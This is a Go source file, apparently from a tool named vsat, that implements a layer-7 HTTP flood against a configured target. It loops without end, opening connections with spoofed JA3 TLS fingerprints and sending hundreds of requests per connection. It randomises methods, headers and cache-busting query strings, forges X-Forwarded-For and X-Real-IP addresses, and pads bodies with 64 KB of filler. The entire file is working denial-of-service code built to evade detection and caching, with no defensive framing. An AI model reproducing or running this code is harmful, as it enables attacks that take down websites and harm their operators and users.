package l7

import (
	"fmt"
	"math/rand"
	"time"

	"github.com/MatrixTM26/vsat/internal/fingerprint"
	"github.com/MatrixTM26/vsat/internal/methods"
	"github.com/MatrixTM26/vsat/internal/random"
)

var HTTPMethods = []string{"GET", "POST", "PUT", "HEAD", "DELETE", "PATCH", "OPTIONS", "CONNECT", "TRACE"}

var AcceptHeaders = []string{
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
	"application/json,text/plain,*/*",
	"*/*",
}

var AcceptEncodings = []string{
	"gzip, deflate, br",
	"gzip, deflate",
	"br, gzip",
	"identity",
}

var AcceptLanguages = []string{
	"en-US,en;q=0.9",
	"en-GB,en;q=0.8",
	"id-ID,id;q=0.9,en;q=0.8",
	"fr-FR,fr;q=0.9",
	"de-DE,de;q=0.9",
}

var CacheControls = []string{
	"no-cache",
	"no-store",
	"max-age=0",
	"no-cache, no-store, must-revalidate",
}

func HTTPExecutor(Cfg *methods.Config, Stop <-chan struct{}) {
	for {
		select {
		case <-Stop:
			return
		default:
		}

		Conn, Err := fingerprint.CreateJA3Socket(Cfg.IP, Cfg.Port, Cfg.Scheme, Cfg.Host, Cfg.Protocol, Cfg.JAProfile)
		if Err != nil {
			continue
		}

		LocalCount := int64(0)
		LocalBytes := int64(0)

		for I := 0; I < 500; I++ {
			select {
			case <-Stop:
				Conn.Close()
				Cfg.Stats.RequestsCount.Add(LocalCount)
				Cfg.Stats.BytesSent.Add(LocalBytes)
				return
			default:
			}

			CurrentMethod := Cfg.Method
			if CurrentMethod == "RANDOM" {
				CurrentMethod = HTTPMethods[rand.Intn(len(HTTPMethods))]
			}

			UA      := Cfg.UserAgents[rand.Intn(len(Cfg.UserAgents))]
			Ref     := Cfg.Referers[rand.Intn(len(Cfg.Referers))]
			PathQ   := fmt.Sprintf("%s?=%d&%s", Cfg.Path, time.Now().UnixMicro(), random.RandomString(8))
			XFF     := random.RandomIP()
			Accept  := AcceptHeaders[rand.Intn(len(AcceptHeaders))]
			AccEnc  := AcceptEncodings[rand.Intn(len(AcceptEncodings))]
			AccLang := AcceptLanguages[rand.Intn(len(AcceptLanguages))]
			Cache   := CacheControls[rand.Intn(len(CacheControls))]

			Req := fmt.Sprintf("%s %s HTTP/1.1\r\n", CurrentMethod, PathQ)
			Req += fmt.Sprintf("Host: %s\r\n", Cfg.Host)
			Req += fmt.Sprintf("User-Agent: %s\r\n", UA)
			Req += fmt.Sprintf("Accept: %s\r\n", Accept)
			Req += fmt.Sprintf("Accept-Encoding: %s\r\n", AccEnc)
			Req += fmt.Sprintf("Accept-Language: %s\r\n", AccLang)
			Req += fmt.Sprintf("Cache-Control: %s\r\n", Cache)
			Req += "Pragma: no-cache\r\n"
			Req += fmt.Sprintf("Referer: %s\r\n", Ref)
			Req += fmt.Sprintf("X-Forwarded-For: %s\r\n", XFF)
			Req += fmt.Sprintf("X-Real-IP: %s\r\n", random.RandomIP())
			Req += fmt.Sprintf("X-Request-ID: %s\r\n", random.RandomString(32))
			Req += "Connection: keep-alive\r\n"

			var Payload []byte
			if CurrentMethod == "POST" || CurrentMethod == "PUT" || CurrentMethod == "PATCH" {
				Body := make([]byte, 65536)
				for J := range Body {
					Body[J] = 'X'
				}
				Req += fmt.Sprintf("Content-Length: %d\r\n\r\n", len(Body))
				Payload = append([]byte(Req), Body...)
			} else {
				Req += "\r\n"
				Payload = []byte(Req)
			}

			_, Err = Conn.Write(Payload)
			if Err != nil {
				break
			}
			LocalCount++
			LocalBytes += int64(len(Payload))

			Conn.SetReadDeadline(time.Now().Add(time.Millisecond))
			Tmp := make([]byte, 16384)
			Conn.Read(Tmp)
		}

		Conn.Close()
		Cfg.Stats.RequestsCount.Add(LocalCount)
		Cfg.Stats.BytesSent.Add(LocalBytes)
	}
}
